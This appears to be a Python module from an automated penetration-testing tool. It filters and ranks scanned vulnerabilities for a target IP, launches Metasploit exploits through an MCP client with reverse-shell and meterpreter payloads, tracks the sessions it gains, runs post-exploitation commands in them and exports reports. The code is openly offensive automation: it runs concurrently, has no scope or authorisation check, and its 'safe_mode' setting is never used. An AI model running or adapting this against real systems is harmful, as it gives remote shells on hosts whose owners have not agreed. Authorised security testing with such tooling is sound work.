#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞利用管理模組
Exploit Manager Module

提供自動化漏洞利用功能
"""

import asyncio
import json
import time
import uuid
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum

from ..core.logger import get_logger
from ..integrations.mcp_client import MetasploitMCPClient
from ..scanners.vulnerability_scanner import VulnerabilityResult, VulnerabilitySeverity


class ExploitStatus(Enum):
    """
    漏洞利用狀態
    """
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    ERROR = "error"


class SessionType(Enum):
    """
    會話類型
    """
    METERPRETER = "meterpreter"
    SHELL = "shell"
    BIND = "bind"
    REVERSE = "reverse"


@dataclass
class ExploitPayload:
    """
    漏洞利用載荷
    """
    name: str
    type: str
    platform: str
    arch: str
    options: Dict[str, Any] = field(default_factory=dict)
    encoded: bool = False
    encoder: Optional[str] = None
    iterations: int = 1
    bad_chars: Optional[str] = None
    format: str = "raw"


@dataclass
class ExploitModule:
    """
    漏洞利用模組
    """
    name: str
    path: str
    description: str
    targets: List[str] = field(default_factory=list)
    platform: List[str] = field(default_factory=list)
    rank: str = "normal"
    disclosure_date: Optional[str] = None
    references: List[str] = field(default_factory=list)
    cve_ids: List[str] = field(default_factory=list)
    required_options: List[str] = field(default_factory=list)
    optional_options: List[str] = field(default_factory=list)
    payloads: List[str] = field(default_factory=list)
    reliability: int = 50
    side_effects: List[str] = field(default_factory=list)


@dataclass
class ExploitAttempt:
    """
    漏洞利用嘗試
    """
    attempt_id: str
    target_ip: str
    target_port: int
    vulnerability_id: str
    exploit_module: str
    payload: Optional[ExploitPayload] = None
    options: Dict[str, Any] = field(default_factory=dict)
    status: ExploitStatus = ExploitStatus.PENDING
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    duration: Optional[float] = None
    session_id: Optional[int] = None
    session_type: Optional[SessionType] = None
    output: Optional[str] = None
    error_message: Optional[str] = None
    success_indicators: List[str] = field(default_factory=list)
    post_exploit_commands: List[str] = field(default_factory=list)
    cleanup_commands: List[str] = field(default_factory=list)


@dataclass
class ExploitSession:
    """
    漏洞利用會話
    """
    session_id: int
    session_type: SessionType
    target_ip: str
    target_port: int
    exploit_module: str
    payload_name: str
    created_time: float
    last_activity: float
    is_active: bool = True
    platform: Optional[str] = None
    arch: Optional[str] = None
    user: Optional[str] = None
    computer: Optional[str] = None
    domain: Optional[str] = None
    privileges: Optional[str] = None
    process_id: Optional[int] = None
    process_name: Optional[str] = None
    session_info: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ExploitReport:
    """
    漏洞利用報告
    """
    report_id: str
    target: str
    start_time: float
    end_time: Optional[float] = None
    duration: Optional[float] = None
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    active_sessions: int = 0
    attempts: List[ExploitAttempt] = field(default_factory=list)
    sessions: List[ExploitSession] = field(default_factory=list)
    vulnerabilities_exploited: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)


class ExploitManager:
    """
    漏洞利用管理器
    
    管理自動化漏洞利用過程
    """
    
    def __init__(self, mcp_client: MetasploitMCPClient, config: Optional[Dict[str, Any]] = None):
        """
        初始化漏洞利用管理器
        
        Args:
            mcp_client: Metasploit MCP 客戶端
            config: 配置
        """
        self.mcp_client = mcp_client
        self.config = config or {}
        self.logger = get_logger()
        
        # 默認配置
        self.default_config = {
            'max_concurrent_exploits': 3,
            'exploit_timeout': 300,
            'session_timeout': 3600,
            'auto_cleanup': True,
            'safe_mode': True,
            'payload_preferences': {
                'windows': ['windows/meterpreter/reverse_tcp', 'windows/shell/reverse_tcp'],
                'linux': ['linux/x86/meterpreter/reverse_tcp', 'linux/x86/shell/reverse_tcp'],
                'generic': ['generic/shell_reverse_tcp']
            },
            'lhost': '0.0.0.0',
            'lport_range': (4444, 4500),
            'exploit_ranking': {
                'excellent': 100,
                'great': 90,
                'good': 80,
                'normal': 70,
                'average': 60,
                'low': 50,
                'manual': 40
            }
        }
        
        # 合併配置
        for key, value in self.default_config.items():
            if key not in self.config:
                self.config[key] = value
        
        # 內部狀態
        self.active_attempts: Dict[str, ExploitAttempt] = {}
        self.active_sessions: Dict[int, ExploitSession] = {}
        self.exploit_modules: Dict[str, ExploitModule] = {}
        self.next_lport = self.config['lport_range'][0]
        
        # 初始化
        asyncio.create_task(self._initialize())
    
    async def _initialize(self):
        """
        初始化管理器
        """
        try:
            # 加載漏洞利用模組信息
            await self._load_exploit_modules()
            
            # 檢查現有會話
            await self._sync_active_sessions()
            
            self.logger.info("漏洞利用管理器初始化完成")
            
        except Exception as e:
            self.logger.error(f"漏洞利用管理器初始化失敗: {e}")
    
    async def exploit_vulnerabilities(self, vulnerabilities: List[VulnerabilityResult],
                                    target_ip: str, **kwargs) -> ExploitReport:
        """
        自動利用漏洞
        
        Args:
            vulnerabilities: 漏洞列表
            target_ip: 目標 IP
            **kwargs: 其他參數
            
        Returns:
            漏洞利用報告
        """
        report_id = f"exploit_report_{int(time.time())}"
        start_time = time.time()
        
        self.logger.info(f"開始自動漏洞利用: {target_ip}", {
            "report_id": report_id,
            "vulnerability_count": len(vulnerabilities)
        })
        
        report = ExploitReport(
            report_id=report_id,
            target=target_ip,
            start_time=start_time
        )
        
        try:
            # 過濾和排序漏洞
            exploitable_vulns = self._filter_exploitable_vulnerabilities(vulnerabilities)
            sorted_vulns = self._prioritize_vulnerabilities(exploitable_vulns)
            
            self.logger.info(f"發現 {len(sorted_vulns)} 個可利用漏洞")
            
            # 並發執行漏洞利用
            semaphore = asyncio.Semaphore(self.config['max_concurrent_exploits'])
            tasks = []
            
            for vuln in sorted_vulns:
                task = self._exploit_vulnerability_with_semaphore(
                    semaphore, vuln, target_ip, **kwargs
                )
                tasks.append(task)
            
            # 等待所有任務完成
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # 處理結果
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    error_msg = f"漏洞利用任務失敗: {str(result)}"
                    self.logger.error(error_msg)
                    report.errors.append(error_msg)
                elif isinstance(result, ExploitAttempt):
                    report.attempts.append(result)
                    
                    if result.status == ExploitStatus.SUCCESS:
                        report.successful_attempts += 1
                        if result.vulnerability_id not in report.vulnerabilities_exploited:
                            report.vulnerabilities_exploited.append(result.vulnerability_id)
                    else:
                        report.failed_attempts += 1
            
            # 更新會話信息
            await self._sync_active_sessions()
            report.sessions = list(self.active_sessions.values())
            report.active_sessions = len([s for s in report.sessions if s.is_active])
            
            # 計算統計信息
            report.total_attempts = len(report.attempts)
            
            end_time = time.time()
            report.end_time = end_time
            report.duration = end_time - start_time
            
            self.logger.info(f"漏洞利用完成: {target_ip}", {
                "report_id": report_id,
                "duration": report.duration,
                "successful_attempts": report.successful_attempts,
                "active_sessions": report.active_sessions
            })
            
        except Exception as e:
            error_msg = f"漏洞利用過程失敗: {str(e)}"
            self.logger.error(error_msg, exc_info=True)
            report.errors.append(error_msg)
            
            end_time = time.time()
            report.end_time = end_time
            report.duration = end_time - start_time
        
        return report
    
    async def _exploit_vulnerability_with_semaphore(self, semaphore: asyncio.Semaphore,
                                                  vulnerability: VulnerabilityResult,
                                                  target_ip: str, **kwargs) -> ExploitAttempt:
        """
        使用信號量控制並發的漏洞利用
        
        Args:
            semaphore: 信號量
            vulnerability: 漏洞信息
            target_ip: 目標 IP
            **kwargs: 其他參數
            
        Returns:
            漏洞利用嘗試
        """
        async with semaphore:
            return await self._exploit_single_vulnerability(
                vulnerability, target_ip, **kwargs
            )
    
    async def _exploit_single_vulnerability(self, vulnerability: VulnerabilityResult,
                                          target_ip: str, **kwargs) -> ExploitAttempt:
        """
        利用單個漏洞
        
        Args:
            vulnerability: 漏洞信息
            target_ip: 目標 IP
            **kwargs: 其他參數
            
        Returns:
            漏洞利用嘗試
        """
        attempt_id = str(uuid.uuid4())
        
        attempt = ExploitAttempt(
            attempt_id=attempt_id,
            target_ip=target_ip,
            target_port=vulnerability.target_port or 0,
            vulnerability_id=vulnerability.vulnerability.vuln_id if vulnerability.vulnerability else "unknown",
            exploit_module="",
            start_time=time.time(),
            status=ExploitStatus.RUNNING
        )
        
        self.active_attempts[attempt_id] = attempt
        
        try:
            # 查找適用的漏洞利用模組
            exploit_modules = self._find_exploit_modules(vulnerability)
            
            if not exploit_modules:
                attempt.status = ExploitStatus.FAILED
                attempt.error_message = "未找到適用的漏洞利用模組"
                return attempt
            
            # 嘗試每個漏洞利用模組
            for module in exploit_modules:
                self.logger.info(f"嘗試漏洞利用: {module.name}", {
                    "attempt_id": attempt_id,
                    "target": f"{target_ip}:{vulnerability.target_port}"
                })
                
                attempt.exploit_module = module.name
                
                # 選擇載荷
                payload = self._select_payload(module, vulnerability)
                if not payload:
                    continue
                
                attempt.payload = payload
                
                # 配置選項
                options = self._configure_exploit_options(
                    module, vulnerability, target_ip, payload
                )
                attempt.options = options
                
                # 執行漏洞利用
                success, session_id, output = await self._execute_exploit(
                    module, payload, options
                )
                
                attempt.output = output
                
                if success and session_id:
                    attempt.status = ExploitStatus.SUCCESS
                    attempt.session_id = session_id
                    attempt.session_type = self._determine_session_type(payload)
                    
                    # 創建會話記錄
                    await self._create_session_record(
                        session_id, attempt, module, payload
                    )
                    
                    self.logger.info(f"漏洞利用成功: {module.name}", {
                        "attempt_id": attempt_id,
                        "session_id": session_id
                    })
                    
                    break
                else:
                    self.logger.warning(f"漏洞利用失敗: {module.name}", {
                        "attempt_id": attempt_id
                    })
            
            if attempt.status == ExploitStatus.RUNNING:
                attempt.status = ExploitStatus.FAILED
                attempt.error_message = "所有漏洞利用模組都失敗了"
            
        except asyncio.TimeoutError:
            attempt.status = ExploitStatus.TIMEOUT
            attempt.error_message = "漏洞利用超時"
            
        except Exception as e:
            attempt.status = ExploitStatus.ERROR
            attempt.error_message = str(e)
            self.logger.error(f"漏洞利用異常: {e}", {
                "attempt_id": attempt_id
            }, exc_info=True)
        
        finally:
            attempt.end_time = time.time()
            if attempt.start_time:
                attempt.duration = attempt.end_time - attempt.start_time
            
            # 清理
            if attempt_id in self.active_attempts:
                del self.active_attempts[attempt_id]
        
        return attempt
    
    def _filter_exploitable_vulnerabilities(self, vulnerabilities: List[VulnerabilityResult]) -> List[VulnerabilityResult]:
        """
        過濾可利用的漏洞
        
        Args:
            vulnerabilities: 漏洞列表
            
        Returns:
            可利用的漏洞列表
        """
        exploitable = []
        
        for vuln in vulnerabilities:
            # 檢查是否有漏洞信息
            if not vuln.vulnerability:
                continue
            
            # 檢查是否確認為漏洞
            if vuln.status.value != "vulnerable":
                continue
            
            # 檢查是否有已知的漏洞利用
            if vuln.vulnerability.exploit_available or vuln.vulnerability.metasploit_modules:
                exploitable.append(vuln)
                continue
            
            # 檢查是否有 CVE 編號（可能有公開漏洞利用）
            if vuln.vulnerability.cve_ids:
                exploitable.append(vuln)
                continue
            
            # 檢查漏洞嚴重程度
            if vuln.vulnerability.severity in [VulnerabilitySeverity.CRITICAL, VulnerabilitySeverity.HIGH]:
                exploitable.append(vuln)
        
        return exploitable
    
    def _prioritize_vulnerabilities(self, vulnerabilities: List[VulnerabilityResult]) -> List[VulnerabilityResult]:
        """
        優先排序漏洞
        
        Args:
            vulnerabilities: 漏洞列表
            
        Returns:
            排序後的漏洞列表
        """
        def priority_score(vuln: VulnerabilityResult) -> int:
            score = 0
            
            if not vuln.vulnerability:
                return score
            
            # 嚴重程度評分
            severity_scores = {
                VulnerabilitySeverity.CRITICAL: 100,
                VulnerabilitySeverity.HIGH: 80,
                VulnerabilitySeverity.MEDIUM: 60,
                VulnerabilitySeverity.LOW: 40
            }
            score += severity_scores.get(vuln.vulnerability.severity, 20)
            
            # 已知漏洞利用加分
            if vuln.vulnerability.exploit_available:
                score += 50
            
            # Metasploit 模組加分
            if vuln.vulnerability.metasploit_modules:
                score += 40
            
            # CVE 編號加分
            if vuln.vulnerability.cve_ids:
                score += 30
            
            # CVSS 評分加分
            if vuln.vulnerability.cvss_score:
                score += int(vuln.vulnerability.cvss_score * 5)
            
            # 置信度加分
            if vuln.confidence:
                score += vuln.confidence // 10
            
            return score
        
        return sorted(vulnerabilities, key=priority_score, reverse=True)
    
    def _find_exploit_modules(self, vulnerability: VulnerabilityResult) -> List[ExploitModule]:
        """
        查找適用的漏洞利用模組
        
        Args:
            vulnerability: 漏洞信息
            
        Returns:
            漏洞利用模組列表
        """
        modules = []
        
        if not vulnerability.vulnerability:
            return modules
        
        # 1. 檢查已知的 Metasploit 模組
        for module_name in vulnerability.vulnerability.metasploit_modules:
            if module_name in self.exploit_modules:
                modules.append(self.exploit_modules[module_name])
        
        # 2. 根據 CVE 編號查找
        for cve_id in vulnerability.vulnerability.cve_ids:
            for module in self.exploit_modules.values():
                if cve_id in module.cve_ids:
                    if module not in modules:
                        modules.append(module)
        
        # 3. 根據服務和端口查找
        if vulnerability.service and vulnerability.target_port:
            for module in self.exploit_modules.values():
                # 檢查模組是否適用於該服務
                if self._is_module_applicable(module, vulnerability):
                    if module not in modules:
                        modules.append(module)
        
        # 按可靠性排序
        modules.sort(key=lambda m: (self.config['exploit_ranking'].get(m.rank, 50), m.reliability), reverse=True)
        
        return modules
    
    def _is_module_applicable(self, module: ExploitModule, vulnerability: VulnerabilityResult) -> bool:
        """
        檢查模組是否適用於漏洞
        
        Args:
            module: 漏洞利用模組
            vulnerability: 漏洞信息
            
        Returns:
            是否適用
        """
        # 檢查端口
        if vulnerability.target_port:
            # 從模組路徑或名稱中推斷適用端口
            common_ports = {
                'http': [80, 443, 8080, 8443],
                'ssh': [22],
                'ftp': [21],
                'smtp': [25, 587],
                'smb': [139, 445],
                'mysql': [3306],
                'mssql': [1433],
                'oracle': [1521],
                'rdp': [3389]
            }
            
            for service, ports in common_ports.items():
                if service in module.path.lower() or service in module.name.lower():
                    if vulnerability.target_port in ports:
                        return True
        
        # 檢查服務名稱
        if vulnerability.service:
            service_lower = vulnerability.service.lower()
            if (service_lower in module.path.lower() or 
                service_lower in module.name.lower() or
                service_lower in module.description.lower()):
                return True
        
        return False
    
    def _select_payload(self, module: ExploitModule, vulnerability: VulnerabilityResult) -> Optional[ExploitPayload]:
        """
        選擇載荷
        
        Args:
            module: 漏洞利用模組
            vulnerability: 漏洞信息
            
        Returns:
            載荷
        """
        # 確定目標平台
        platform = self._determine_target_platform(vulnerability)
        
        # 獲取平台偏好的載荷
        preferred_payloads = self.config['payload_preferences'].get(
            platform, self.config['payload_preferences']['generic']
        )
        
        # 選擇第一個可用的載荷
        for payload_name in preferred_payloads:
            if payload_name in module.payloads or not module.payloads:
                # 分配端口
                lport = self._allocate_port()
                
                return ExploitPayload(
                    name=payload_name,
                    type="reverse",
                    platform=platform,
                    arch="x86",
                    options={
                        'LHOST': self.config['lhost'],
                        'LPORT': lport
                    }
                )
        
        return None
    
    def _determine_target_platform(self, vulnerability: VulnerabilityResult) -> str:
        """
        確定目標平台
        
        Args:
            vulnerability: 漏洞信息
            
        Returns:
            平台名稱
        """
        # 從服務名稱推斷
        if vulnerability.service:
            service_lower = vulnerability.service.lower()
            
            if 'windows' in service_lower or 'microsoft' in service_lower:
                return 'windows'
            elif any(x in service_lower for x in ['linux', 'unix', 'apache', 'nginx']):
                return 'linux'
        
        # 從端口推斷
        if vulnerability.target_port:
            windows_ports = [135, 139, 445, 1433, 3389]
            if vulnerability.target_port in windows_ports:
                return 'windows'
        
        return 'generic'
    
    def _allocate_port(self) -> int:
        """
        分配端口
        
        Returns:
            端口號
        """
        port = self.next_lport
        self.next_lport += 1
        
        if self.next_lport > self.config['lport_range'][1]:
            self.next_lport = self.config['lport_range'][0]
        
        return port
    
    def _configure_exploit_options(self, module: ExploitModule,
                                 vulnerability: VulnerabilityResult,
                                 target_ip: str, payload: ExploitPayload) -> Dict[str, Any]:
        """
        配置漏洞利用選項
        
        Args:
            module: 漏洞利用模組
            vulnerability: 漏洞信息
            target_ip: 目標 IP
            payload: 載荷
            
        Returns:
            選項字典
        """
        options = {
            'RHOSTS': target_ip
        }
        
        # 設置目標端口
        if vulnerability.target_port:
            options['RPORT'] = vulnerability.target_port
        
        # 添加載荷選項
        options.update(payload.options)
        
        # 添加模組特定選項
        # 這裡可以根據具體模組添加特定配置
        
        return options
    
    async def _execute_exploit(self, module: ExploitModule, payload: ExploitPayload,
                             options: Dict[str, Any]) -> Tuple[bool, Optional[int], str]:
        """
        執行漏洞利用
        
        Args:
            module: 漏洞利用模組
            payload: 載荷
            options: 選項
            
        Returns:
            (成功標誌, 會話ID, 輸出)
        """
        try:
            # 使用 MCP 客戶端執行漏洞利用
            result = await asyncio.wait_for(
                self.mcp_client.run_exploit(
                    module_name=module.path,
                    options=options,
                    payload_name=payload.name,
                    payload_options=payload.options,
                    run_as_job=False,
                    timeout_seconds=self.config['exploit_timeout']
                ),
                timeout=self.config['exploit_timeout']
            )
            
            success = result.get('success', False)
            session_id = result.get('session_id')
            output = result.get('output', '')
            
            return success, session_id, output
            
        except asyncio.TimeoutError:
            return False, None, "漏洞利用超時"
        except Exception as e:
            return False, None, f"漏洞利用執行失敗: {str(e)}"
    
    def _determine_session_type(self, payload: ExploitPayload) -> SessionType:
        """
        確定會話類型
        
        Args:
            payload: 載荷
            
        Returns:
            會話類型
        """
        payload_name_lower = payload.name.lower()
        
        if 'meterpreter' in payload_name_lower:
            return SessionType.METERPRETER
        elif 'shell' in payload_name_lower:
            return SessionType.SHELL
        elif 'bind' in payload_name_lower:
            return SessionType.BIND
        else:
            return SessionType.REVERSE
    
    async def _create_session_record(self, session_id: int, attempt: ExploitAttempt,
                                   module: ExploitModule, payload: ExploitPayload):
        """
        創建會話記錄
        
        Args:
            session_id: 會話 ID
            attempt: 漏洞利用嘗試
            module: 漏洞利用模組
            payload: 載荷
        """
        session = ExploitSession(
            session_id=session_id,
            session_type=attempt.session_type,
            target_ip=attempt.target_ip,
            target_port=attempt.target_port,
            exploit_module=module.name,
            payload_name=payload.name,
            created_time=time.time(),
            last_activity=time.time()
        )
        
        # 獲取會話詳細信息
        try:
            session_info = await self.mcp_client.get_session_info(session_id)
            if session_info:
                session.platform = session_info.get('platform')
                session.arch = session_info.get('arch')
                session.user = session_info.get('username')
                session.computer = session_info.get('computer')
                session.session_info = session_info
        except Exception as e:
            self.logger.warning(f"獲取會話信息失敗: {e}")
        
        self.active_sessions[session_id] = session
    
    async def _load_exploit_modules(self):
        """
        加載漏洞利用模組信息
        """
        try:
            # 從 MCP 客戶端獲取漏洞利用模組列表
            modules = await self.mcp_client.list_exploits()
            
            for module_name in modules:
                # 創建模組信息（簡化版本）
                module = ExploitModule(
                    name=module_name,
                    path=module_name,
                    description=f"Metasploit exploit module: {module_name}",
                    rank="normal"
                )
                
                self.exploit_modules[module_name] = module
            
            self.logger.info(f"加載了 {len(self.exploit_modules)} 個漏洞利用模組")
            
        except Exception as e:
            self.logger.error(f"加載漏洞利用模組失敗: {e}")
    
    async def _sync_active_sessions(self):
        """
        同步活動會話
        """
        try:
            # 從 MCP 客戶端獲取活動會話
            sessions = await self.mcp_client.list_active_sessions()
            
            # 更新會話狀態
            current_session_ids = set(sessions.keys()) if sessions else set()
            
            # 標記不存在的會話為非活動
            for session_id in list(self.active_sessions.keys()):
                if session_id not in current_session_ids:
                    self.active_sessions[session_id].is_active = False
            
            # 添加新會話（如果不在記錄中）
            for session_id, session_info in (sessions or {}).items():
                if session_id not in self.active_sessions:
                    # 創建基本會話記錄
                    session = ExploitSession(
                        session_id=session_id,
                        session_type=SessionType.METERPRETER if session_info.get('type') == 'meterpreter' else SessionType.SHELL,
                        target_ip=session_info.get('session_host', 'unknown'),
                        target_port=session_info.get('session_port', 0),
                        exploit_module='unknown',
                        payload_name='unknown',
                        created_time=time.time(),
                        last_activity=time.time(),
                        session_info=session_info
                    )
                    
                    self.active_sessions[session_id] = session
                else:
                    # 更新現有會話
                    self.active_sessions[session_id].last_activity = time.time()
                    self.active_sessions[session_id].is_active = True
            
        except Exception as e:
            self.logger.error(f"同步活動會話失敗: {e}")
    
    async def get_active_sessions(self) -> List[ExploitSession]:
        """
        獲取活動會話
        
        Returns:
            活動會話列表
        """
        await self._sync_active_sessions()
        return [session for session in self.active_sessions.values() if session.is_active]
    
    async def execute_post_exploit(self, session_id: int, commands: List[str]) -> Dict[str, Any]:
        """
        執行後滲透命令
        
        Args:
            session_id: 會話 ID
            commands: 命令列表
            
        Returns:
            執行結果
        """
        results = {}
        
        try:
            for command in commands:
                self.logger.info(f"執行後滲透命令: {command}", {
                    "session_id": session_id
                })
                
                result = await self.mcp_client.send_session_command(
                    session_id=session_id,
                    command=command
                )
                
                results[command] = result
                
                # 更新會話活動時間
                if session_id in self.active_sessions:
                    self.active_sessions[session_id].last_activity = time.time()
        
        except Exception as e:
            self.logger.error(f"執行後滲透命令失敗: {e}")
            results['error'] = str(e)
        
        return results
    
    async def cleanup_sessions(self, session_ids: Optional[List[int]] = None):
        """
        清理會話
        
        Args:
            session_ids: 要清理的會話 ID 列表，None 表示清理所有
        """
        if session_ids is None:
            session_ids = list(self.active_sessions.keys())
        
        for session_id in session_ids:
            try:
                await self.mcp_client.terminate_session(session_id)
                
                if session_id in self.active_sessions:
                    self.active_sessions[session_id].is_active = False
                
                self.logger.info(f"會話已清理: {session_id}")
                
            except Exception as e:
                self.logger.error(f"清理會話失敗 {session_id}: {e}")
    
    def export_report(self, report: ExploitReport, output_path: str, format_type: str = "json"):
        """
        導出漏洞利用報告
        
        Args:
            report: 漏洞利用報告
            output_path: 輸出路徑
            format_type: 格式類型
        """
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format_type.lower() == "json":
            self._export_json_report(report, output_path)
        elif format_type.lower() == "html":
            self._export_html_report(report, output_path)
        else:
            raise ValueError(f"不支持的格式: {format_type}")
        
        self.logger.info(f"漏洞利用報告已導出: {output_path}")
    
    def _export_json_report(self, report: ExploitReport, output_path: Path):
        """
        導出 JSON 格式報告
        """
        data = {
            'report_info': {
                'report_id': report.report_id,
                'target': report.target,
                'start_time': report.start_time,
                'end_time': report.end_time,
                'duration': report.duration
            },
            'statistics': {
                'total_attempts': report.total_attempts,
                'successful_attempts': report.successful_attempts,
                'failed_attempts': report.failed_attempts,
                'active_sessions': report.active_sessions,
                'vulnerabilities_exploited': report.vulnerabilities_exploited
            },
            'attempts': [],
            'sessions': [],
            'errors': report.errors
        }
        
        # 添加嘗試信息
        for attempt in report.attempts:
            attempt_data = {
                'attempt_id': attempt.attempt_id,
                'target_ip': attempt.target_ip,
                'target_port': attempt.target_port,
                'vulnerability_id': attempt.vulnerability_id,
                'exploit_module': attempt.exploit_module,
                'status': attempt.status.value,
                'start_time': attempt.start_time,
                'end_time': attempt.end_time,
                'duration': attempt.duration,
                'session_id': attempt.session_id,
                'error_message': attempt.error_message
            }
            
            if attempt.payload:
                attempt_data['payload'] = {
                    'name': attempt.payload.name,
                    'type': attempt.payload.type,
                    'platform': attempt.payload.platform,
                    'options': attempt.payload.options
                }
            
            data['attempts'].append(attempt_data)
        
        # 添加會話信息
        for session in report.sessions:
            session_data = {
                'session_id': session.session_id,
                'session_type': session.session_type.value,
                'target_ip': session.target_ip,
                'target_port': session.target_port,
                'exploit_module': session.exploit_module,
                'payload_name': session.payload_name,
                'created_time': session.created_time,
                'last_activity': session.last_activity,
                'is_active': session.is_active,
                'platform': session.platform,
                'user': session.user,
                'computer': session.computer
            }
            
            data['sessions'].append(session_data)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    def _export_html_report(self, report: ExploitReport, output_path: Path):
        """
        導出 HTML 格式報告
        """
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>漏洞利用報告</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; }
        .stats { display: flex; gap: 20px; margin: 20px 0; }
        .stat-box { padding: 15px; border-radius: 5px; text-align: center; }
        .success { background: #e8f5e8; color: #2e7d32; }
        .failed { background: #ffebee; color: #c62828; }
        .sessions { background: #e3f2fd; color: #1565c0; }
        .attempt-item { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .success-attempt { border-left: 5px solid #4caf50; }
        .failed-attempt { border-left: 5px solid #f44336; }
        .session-item { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; background: #f9f9f9; }
    </style>
</head>
<body>
    <div class="header">
        <h1>漏洞利用報告</h1>
        <p><strong>目標:</strong> {target}</p>
        <p><strong>開始時間:</strong> {start_time}</p>
        <p><strong>持續時間:</strong> {duration:.2f} 秒</p>
    </div>
    
    <div class="stats">
        <div class="stat-box success">
            <h3>{successful_attempts}</h3>
            <p>成功嘗試</p>
        </div>
        <div class="stat-box failed">
            <h3>{failed_attempts}</h3>
            <p>失敗嘗試</p>
        </div>
        <div class="stat-box sessions">
            <h3>{active_sessions}</h3>
            <p>活動會話</p>
        </div>
    </div>
    
    <h2>漏洞利用嘗試</h2>
    {attempts}
    
    <h2>活動會話</h2>
    {sessions}
</body>
</html>
        """
        
        # 生成嘗試列表 HTML
        attempts_html = ""
        for attempt in report.attempts:
            status_class = "success-attempt" if attempt.status == ExploitStatus.SUCCESS else "failed-attempt"
            
            attempt_item = f"""
            <div class="attempt-item {status_class}">
                <h4>{attempt.exploit_module} - {attempt.status.value.upper()}</h4>
                <p><strong>目標:</strong> {attempt.target_ip}:{attempt.target_port}</p>
                <p><strong>漏洞:</strong> {attempt.vulnerability_id}</p>
                <p><strong>持續時間:</strong> {attempt.duration:.2f}秒 (如果有)</p>
                {f'<p><strong>會話ID:</strong> {attempt.session_id}</p>' if attempt.session_id else ''}
                {f'<p><strong>錯誤:</strong> {attempt.error_message}</p>' if attempt.error_message else ''}
            </div>
            """
            attempts_html += attempt_item
        
        # 生成會話列表 HTML
        sessions_html = ""
        for session in report.sessions:
            if session.is_active:
                session_item = f"""
                <div class="session-item">
                    <h4>會話 {session.session_id} ({session.session_type.value})</h4>
                    <p><strong>目標:</strong> {session.target_ip}:{session.target_port}</p>
                    <p><strong>載荷:</strong> {session.payload_name}</p>
                    <p><strong>平台:</strong> {session.platform or 'Unknown'}</p>
                    <p><strong>用戶:</strong> {session.user or 'Unknown'}</p>
                    <p><strong>創建時間:</strong> {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session.created_time))}</p>
                </div>
                """
                sessions_html += session_item
        
        # 填充模板
        html_content = html_template.format(
            target=report.target,
            start_time=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(report.start_time)),
            duration=report.duration or 0,
            successful_attempts=report.successful_attempts,
            failed_attempts=report.failed_attempts,
            active_sessions=report.active_sessions,
            attempts=attempts_html,
            sessions=sessions_html
        )
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)